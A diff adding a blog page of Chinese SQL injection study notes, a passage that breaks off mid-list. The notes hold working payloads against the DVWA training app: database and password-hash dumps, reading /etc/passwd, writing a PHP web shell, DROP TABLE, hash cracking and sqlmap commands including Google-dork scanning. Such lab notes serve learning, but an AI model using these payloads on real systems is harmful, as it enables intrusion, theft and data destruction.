@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="SQL注入笔记 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器  用户登陆判断  12SELECT * FROM users WHERE user=‘uname&apos; AND password=‘pass‘SELECT * FROM users WHERE user=‘name&apos; AND password=&apos;&apos; OR &apos;&apos;=&apos;‘  基于报错的检测方法  ‘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入笔记">
+<meta property="og:url" content="http://yoursite.com/2018/04/21/SQL注入笔记/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="SQL注入笔记 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器  用户登陆判断  12SELECT * FROM users WHERE user=‘uname&apos; AND password=‘pass‘SELECT * FROM users WHERE user=‘name&apos; AND password=&apos;&apos; OR &apos;&apos;=&apos;‘  基于报错的检测方法  ‘">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-04-21T03:06:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入笔记">
+<meta name="twitter:description" content="SQL注入笔记 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器  用户登陆判断  12SELECT * FROM users WHERE user=‘uname&apos; AND password=‘pass‘SELECT * FROM users WHERE user=‘name&apos; AND password=&apos;&apos; OR &apos;&apos;=&apos;‘  基于报错的检测方法  ‘">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SQL注入笔记</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/04/23/XSS漏洞等笔记/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/04/07/Web扫描工具/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/21/SQL注入笔记/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/21/SQL注入笔记/&text=SQL注入笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/21/SQL注入笔记/&is_video=false&description=SQL注入笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入笔记&body=Check out this article: http://yoursite.com/2018/04/21/SQL注入笔记/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/21/SQL注入笔记/&name=SQL注入笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入笔记"><span class="toc-number">1.</span> <span class="toc-text">SQL注入笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL盲注"><span class="toc-number">1.1.</span> <span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP-自动注入"><span class="toc-number">1.2.</span> <span class="toc-text">SQLMAP 自动注入</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SQL注入笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-04-21T03:05:53.000Z" itemprop="datePublished">2018-04-21</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h2><ul>
+<li><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器</p>
+</li>
+<li><p>用户登陆判断</p>
+</li>
+<li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">user</span>=‘uname<span class="string">' AND password=‘pass‘</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE user=‘name'</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">''</span> <span class="keyword">OR</span> <span class="string">''</span>=<span class="string">'‘</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>基于报错的检测方法</p>
+<ul>
+<li><code>‘ “ % ( )</code></li>
+</ul>
+</li>
+<li><p>基于布尔的检测</p>
+<ul>
+<li><code>1’ and ‘1’=‘1</code></li>
+<li><code>1’ and ‘1’=‘2</code></li>
+</ul>
+</li>
+<li><p>表列数/显示信息位于哪一列</p>
+<ul>
+<li><code>‘ order by 9--</code><ul>
+<li>select * 时表字段数=查询字段数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>联合查询</p>
+<ul>
+<li><code>’ union select 1,2--+</code></li>
+<li><code>’ union all select database(),2--+</code></li>
+</ul>
+</li>
+<li><p>hash-identifier</p>
+</li>
+<li><p><code>&#39; union select database(),substring_index(USER(),&quot;@&quot;,1)--</code></p>
+</li>
+<li><p>DB用户：<code>user()</code></p>
+</li>
+<li><p>DB版本：<code>version()</code></p>
+</li>
+<li><p>全局函数：<code>@@datadir @@hostname  @@VERSION @@version_compile_os</code></p>
+</li>
+<li><p>当前库：<code>database()</code></p>
+</li>
+<li><p>ASCII转字符：<code>char()</code></p>
+</li>
+<li><p>连接字符串：<code>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></p>
+</li>
+<li><p>计算哈希：<code>md5()</code></p>
+</li>
+<li><p>Mysql数据结构</p>
+<ul>
+<li>information_schema</li>
+</ul>
+</li>
+<li><p>所有库所有表/统计每库中表的数量</p>
+</li>
+<li><ul>
+<li><code>‘ union select table_name,table_schema from information_schema.tables--+</code></li>
+<li><code>&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --</code></li>
+</ul>
+</li>
+<li><p>DVWA库中的表名</p>
+</li>
+<li><ul>
+<li><code>&#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39;--+</code></li>
+</ul>
+</li>
+<li><p>Users表中的所有列（user_id, first_name, last_name, user, password, avator)</p>
+</li>
+<li><ul>
+<li><code>&#39; union select table_name,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users’--+</code></li>
+</ul>
+</li>
+<li><p>查询user password列的内容</p>
+</li>
+<li><ul>
+<li><code>&#39; union select user,password from dvwa.users--+</code></li>
+<li><code>&#39; union select user,password from users--+</code></li>
+<li><code>&#39; union select null, concat(user,0x3a,password) from users--+</code></li>
+</ul>
+</li>
+<li><p>密码破解</p>
+</li>
+<li><ul>
+<li><code>username:passhash ——&gt; dvwa.txt</code></li>
+<li><code>john --format=raw-MD5 dvwa.txt</code></li>
+</ul>
+</li>
+<li><p>读取文件</p>
+</li>
+<li><ul>
+<li><code>&#39; union SELECT null, load_file(&#39;/etc/passwd&#39;)--+</code></li>
+</ul>
+</li>
+<li><p>写入文件</p>
+</li>
+<li><ul>
+<li><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/a.php&quot; --+</code></li>
+<li>Mysql账号</li>
+<li>文件包含 <code>?page=/tmp/a.php&amp;cmd=ls</code></li>
+<li><code>cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></li>
+<li><code>&#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;/tmp/x.php&#39;--</code></li>
+</ul>
+</li>
+<li><p>保存下载数据库</p>
+</li>
+<li><ul>
+<li><code>&#39; union select null, concat(user,0x3a,password) from users INTO OUTFILE &#39;/tmp/a.db&#39;--</code></li>
+</ul>
+</li>
+<li><p>一个思路：编写服务器端代码</p>
+</li>
+<li><ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name</span><br><span class="line">= $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username =</span><br><span class="line">$_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo</span><br><span class="line">&quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username:</span><br><span class="line">$username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;;</span><br><span class="line">$con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo</span><br><span class="line">&quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to</span><br><span class="line">database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\</span><br><span class="line">\&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\</span><br><span class="line">\&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error</span><br><span class="line">creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot;</span><br><span class="line">action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot;</span><br><span class="line">value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot;</span><br><span class="line">name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;</span><br><span class="line">value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>无权读取information_schema库 / 拒绝union, order by 语句</p>
+</li>
+<li><ul>
+<li>猜列名： <code>&#39; and column is null--+</code></li>
+<li><ul>
+<li>burpsuite 自动猜列名</li>
+</ul>
+</li>
+<li>猜当前表表名：<code>&#39; and table.user is null--+</code></li>
+<li>猜库里其他表： <code>&#39; and(select count(*) from table)&gt;0--+</code></li>
+<li>列表对应关系： <code>&#39; and users.user is null--+</code></li>
+<li>猜字段内容： <code>&#39; or user = &#39;admin</code></li>
+<li><code>&#39; or user like &#39; %a%</code></li>
+<li>猜账号对应密码：</li>
+<li><ul>
+<li><code>&#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>当数据库可写</li>
+<li><ul>
+<li><code>&#39;; update users set user=&#39;yy&#39; where user=&#39;admin</code></li>
+<li><ul>
+<li>注入失败，SQL客户端工具的问题</li>
+<li><code>http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</code></li>
+</ul>
+</li>
+<li><code>&#39;; INSERT INTO users (&#39; user_id&#39;,&#39; first_name&#39;,&#39; last_name&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;) VALUES(‘35&#39;,&#39;yy&#39;,‘y&#39;,‘yyy&#39;,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;,&#39;OK&#39;);--+</code></li>
+<li><code>&#39;;DROP TABLE users;--</code></li>
+</ul>
+</li>
+<li>SQLi没有通用的方法，掌握原理，了解各种数据库特性</li>
+<li>Medium难度级别</li>
+<li><ul>
+<li>mysql_real_escape_string()</li>
+<li><ul>
+<li>PHP 4 &gt;= 4.3.0 PHP 5</li>
+<li>PHP5.5.0已经弃用此函数</li>
+<li>PHP7.0.0 已经删除此函数，代之以mysqli,PDO_MySQL</li>
+</ul>
+</li>
+<li>High级别</li>
+<li><ul>
+<li>mysql_real_escape_string()</li>
+<li>stripslashes()</li>
+<li>is_numeric()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><ul>
+<li><p>不显示数据库内建的报错信息</p>
+</li>
+<li><ul>
+<li>内建的报错信息帮助开发人员发现和修复问题</li>
+<li>报错信息提供关于系统的大量有用信息</li>
+</ul>
+</li>
+<li><p>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果。</p>
+</li>
+<li><p>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断</p>
+</li>
+<li><ul>
+<li><p><code>1 &#39; and 1 = 1--+</code></p>
+</li>
+<li><p><code>1 &#39; and 1=2--+</code></p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,2--+</span><br><span class="line">1&apos; union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+</span><br><span class="line">1&apos; and 1=0 union select null,table_name from information_schema.tables#</span><br><span class="line">1&apos; and 1=0 union select null,table_name from information_schema.columns where</span><br><span class="line">table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>无权读取information_schema库 / 拒绝 union \ order by 语句</p>
+</li>
+<li><ul>
+<li>猜列名： <code>1&#39; and user is not null--+</code></li>
+<li>猜当前表表名： <code>1&#39; and table.user is not null--+</code></li>
+<li>猜库里其他表：<code>1&#39; and (select count() from table)&gt;0--+</code></li>
+<li>列表对应关系：<code>1&#39; and users.user is not null--+</code></li>
+<li>猜字段内容： <code>1&#39; and user=&#39;admin</code></li>
+<li><code>1&#39; or user like &#39;%a%</code></li>
+<li>猜账号对应密码：<code>2&#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99</code></li>
+</ul>
+</li>
+<li><p>开个脑洞</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ORD(MID((VERSION()),1,1))&amp;1&gt;0--+</span><br><span class="line">CURRENT_USER()?DATABASE()</span><br><span class="line">MID(ColumnName, Start [, Length])</span><br><span class="line">ORD(string) #ASCII?</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="SQLMAP-自动注入"><a href="#SQLMAP-自动注入" class="headerlink" title="SQLMAP 自动注入"></a>SQLMAP 自动注入</h3><ul>
+<li><p>开源sql注入漏洞检测，利用工具</p>
+</li>
+<li><p>检测动态页面中get/post参数，cookie, http头</p>
+</li>
+<li><p>数据榨取</p>
+</li>
+<li><p>文件系统访问</p>
+</li>
+<li><p>操作系统命令执行</p>
+</li>
+<li><p>引擎强大，特性丰富</p>
+</li>
+<li><p>XSS漏洞检测</p>
+</li>
+<li><p>五种漏洞检测技术</p>
+</li>
+<li><ul>
+<li>基于布尔的盲注检测</li>
+<li>基于时间的盲注检测</li>
+<li>基于错误的检测</li>
+<li>基于UNION联合查询的检测</li>
+<li><ul>
+<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
+</ul>
+</li>
+<li>基于堆叠查询的检测</li>
+<li><ul>
+<li>堆叠多个查询语句</li>
+<li>适用于非select的数据修改，删除的操作</li>
+</ul>
+</li>
+<li>支持的数据库管理系统DBMS</li>
+<li><ul>
+<li>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite,<br>Firebird, Sybase , SAP MaxDB</li>
+</ul>
+</li>
+<li>其他特性</li>
+<li><ul>
+<li>数据库直接连接-d</li>
+<li><ul>
+<li>不通过SQL注入，指定身份认证信息，IP，端口</li>
+</ul>
+</li>
+<li>与Burpsuite google联合使用，支持正则表达式限定测试目标</li>
+<li>GET POST cookie referer User-Agent （随机或指定）</li>
+<li><ul>
+<li>cookie过期后自动处理set-cookie头，更新cookie信息</li>
+</ul>
+</li>
+<li>限速：最大并发、延迟发送</li>
+<li>支持Basic Digest NTLM CA身份认证</li>
+<li>数据库版本，用户，权限，hash枚举和字典破解，暴力破解表列名称</li>
+<li>文件上传下载，UDF，启动并执行存储过程，操作系统命令执行，访问Windows注册表</li>
+<li>与w3af,metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
+</ul>
+</li>
+<li><code>sqlmap -h / -hh</code></li>
+<li><code>sqlmap -d &quot;mysql://user:password@192.168.20.10:3306/dvwa&quot; -f --users --banner --dbs --schema -a</code></li>
+<li><code>sqlmap --version -v</code></li>
+<li>日志 .sqlmap</li>
+<li>输出</li>
+<li><ul>
+<li>输出内容详细度分7个等级</li>
+</ul>
+</li>
+<li>GET方法</li>
+<li><ul>
+<li><code>sqlmap -u &quot;http://192.168.20.10/mutillidae/index.php?page=user-info.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View+Account+Details&quot; -p username -f</code></li>
+</ul>
+</li>
+<li>扫描URL列表文件</li>
+<li><ul>
+<li><code>sqlmap -m list.txt</code></li>
+</ul>
+</li>
+<li>扫描Google搜索结果</li>
+<li><ul>
+<li><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></li>
+</ul>
+</li>
+<li>POST方法</li>
+<li><ul>
+<li>使用Http请求文件（burpsuite)</li>
+<li><ul>
+<li><code>sqlmap -r request.txt</code></li>
+</ul>
+</li>
+<li>使用burpsuite log 文件</li>
+<li><ul>
+<li><code>sqlmap -l log.txt</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>HTTPS</li>
+<li><ul>
+<li><code>sqlmap -u “https://1.1.1.1/a.php?id=1:8843” --force-ssl</code></li>
+</ul>
+</li>
+<li>扫描配置文件</li>
+<li><ul>
+<li><code>sqlmap -c sqlmap.conf</code></li>
+</ul>
+</li>
+<li>数据段：–data</li>
+<li><ul>
+<li>get/post 都适用</li>
+<li><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;user=1&amp;pass=2&quot; -f</code></li>
+</ul>
+</li>
+<li>变量分隔符：–param-del</li>
+<li><ul>
+<li><code>http://1.1.1.1/a.php?q=foo;id=1 // ; &amp;</code></li>
+<li><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -f</code></li>
+</ul>
+</li>
+<li>cookie头： –cookie</li>
+<li><ul>
+<li>web应用需要基于cookie的身份认证</li>
+<li>检查cookie中的注入点（level &gt;=2)</li>
+<li><code>Set-Cookie / --drop-set-cookie / --cookie-del</code></li>
+<li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f</code></li>
+</ul>
+</li>
+<li>–user-agent</li>
+<li><ul>
+<li><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org</code></li>
+</ul>
+</li>
+<li>–random-agent</li>
+<li><ul>
+<li><code>/usr/share/sqlmap/txt/user-agents.txt</code></li>
+</ul>
+</li>
+<li>sqlmap检查user-agent中的注入点：level&gt;=3</li>
+<li>APP/WAF/IPS/IDS 过滤异常user-agent时报错</li>
+<li>Host头： –host</li>
+<li><ul>
+<li>level=5</li>
+</ul>
+</li>
+<li>referer头： –referer</li>
+<li><ul>
+<li>level&gt;=3</li>
+</ul>
+</li>
+<li>额外的header：–headers</li>
+<li><ul>
+<li>每个头单独一行（名称区分大小写）</li>
+</ul>
+</li>
+<li>–method= GET/POST</li>
+</ul>
+</li>
+<li><p>基于HTTP协议的身份认证</p>
+</li>
+<li><ul>
+<li>basic</li>
+<li>digest</li>
+<li>NTLM</li>
+<li><code>sqlmap. -u &quot;http://1.1.1.1/a.php?id=1&quot; --auth-type Basic --auth-cred &quot;user:pass</code></li>
+</ul>
+</li>
+<li><p>–auth-cert / –auth-file</p>
+</li>
+<li><ul>
+<li>–auth-file = “ca.PEM”</li>
+<li>含有私钥的PEM格式证书文件</li>
+<li>PEM格式的证书链文件</li>
+</ul>
+</li>
+<li><p>Http(s)代理</p>
+</li>
+<li><ul>
+<li><code>--proxy=&quot;http://127.0.0.1:8087&quot;</code></li>
+<li><code>--proxy-cred=&quot;name:pass&quot;</code></li>
+<li><code>--ignore-proxy</code> 忽略系统级代理设置，通常用于扫描本地网络目标</li>
+</ul>
+</li>
+<li><p>–delay</p>
+</li>
+<li><ul>
+<li>每次https请求之间延迟时间，浮点数，单位为秒，默认无延迟</li>
+</ul>
+</li>
+<li><p>–timeout</p>
+</li>
+<li><ul>
+<li>请求超时时间，浮点数，默认为30秒</li>
+</ul>
+</li>
+<li><p>–retries</p>
+</li>
+<li><ul>
+<li>http(s)连接超时重试次数，默认3次</li>
+</ul>
+</li>
+<li><p>–randomize</p>
+</li>
+<li><ul>
+<li>长度，类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
+</ul>
+</li>
+<li><p>–scope</p>
+</li>
+<li><ul>
+<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
+<li><code>sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)“</code></li>
+<li><code>sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs</code></li>
+</ul>
+</li>
+<li><p>–safe-url / –safe-freq</p>
+</li>
+<li><ul>
+<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁session</li>
+<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
+</ul>
+</li>
+<li><p>–skip-urlencode</p>
+</li>
+<li><ul>
+<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
+</ul>
+</li>
+<li><p>–eval</p>
+</li>
+<li><ul>
+<li>每次请求前执行指定的python代码</li>
+<li>每次请求更改或增加新的参数值（时间依赖，其他参数值依赖）</li>
+<li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></li>
+</ul>
+</li>
+<li><p>优化性能</p>
+</li>
+<li><p>–predict-output</p>
+</li>
+<li><ul>
+<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
+<li>版本名，用户名，密码，privileges，role，数据库名称，表名，列名</li>
+<li>与–threads参数不兼容</li>
+<li>统计表：<code>/usr/share/sqlmap/txt/common-outputs.txt</code></li>
+</ul>
+</li>
+<li><p>–keep-alive</p>
+</li>
+<li><ul>
+<li>使用http 长连接，性能好</li>
+<li>与–proxy参数不兼容</li>
+<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
+</ul>
+</li>
+<li><p>–null-connection</p>
+</li>
+<li><ul>
+<li>只获取相应页面的大小值，而非页面具体内容</li>
+<li>通常用于盲注判断 真/假， 降低网络带宽消耗</li>
+<li>与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
+</ul>
+</li>
+<li><p>–threads</p>
+</li>
+<li><ul>
+<li>最大并发线程</li>
+<li>盲注时每个线程获取一个字符（7次请求），获取完成后线程结束</li>
+<li>默认值为1，建议不要超过10，否则可能影响站点可用性</li>
+<li>与 –predict-output参数不兼容</li>
+</ul>
+</li>
+<li><p>-o 开启前三个性能参数（除–threads参数）</p>
+</li>
+<li><p>-p</p>
+</li>
+<li><ul>
+<li>指定扫描的参数，使–level失效</li>
+<li>-p “user-agent, referer”</li>
+</ul>
+</li>
+<li><p>–skip</p>
+</li>
+<li><ul>
+<li>排除指定的扫描参数</li>
+<li><code>--level=5 --skip=&quot;id,user-agent&quot;</code></li>
+</ul>
+</li>
+<li><p>uri注入点</p>
+</li>
+<li><ul>
+<li><code>sqlmap -u “http://targeturl/param1/value1*/param2/value2*/&quot;</code></li>
+</ul>
+</li>
+<li><p><code>--dbms=&quot;mysql&quot;</code></p>
+</li>
+<li><p><code>--os</code></p>
+</li>
+<li><p><code>--invalid-bignum / --invalid-logical</code></p>
+</li>
+<li><ul>
+<li>通常sqlmap使用负值使参数取值失效</li>
+<li>bignum使用大数使参数值失效</li>
+<li>Logical使用布尔判断使取值失效</li>
+</ul>
+</li>
+<li><p>–no-cast</p>
+</li>
+<li><ul>
+<li>榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果</li>
+<li>老版本mysql数据库需要开启此开关</li>
+</ul>
+</li>
+<li><p>–no-escape</p>
+</li>
+<li><ul>
+<li>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串</li>
+<li><code>SELECT &#39;foo&#39; ? SELECT CHAR(102)+CHAR(111)+CHAR(111)</code></li>
+<li>本参数将关闭此功能</li>
+</ul>
+</li>
+<li><p>–prefix / –suffix</p>
+</li>
+<li><ul>
+<li><code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</code></li>
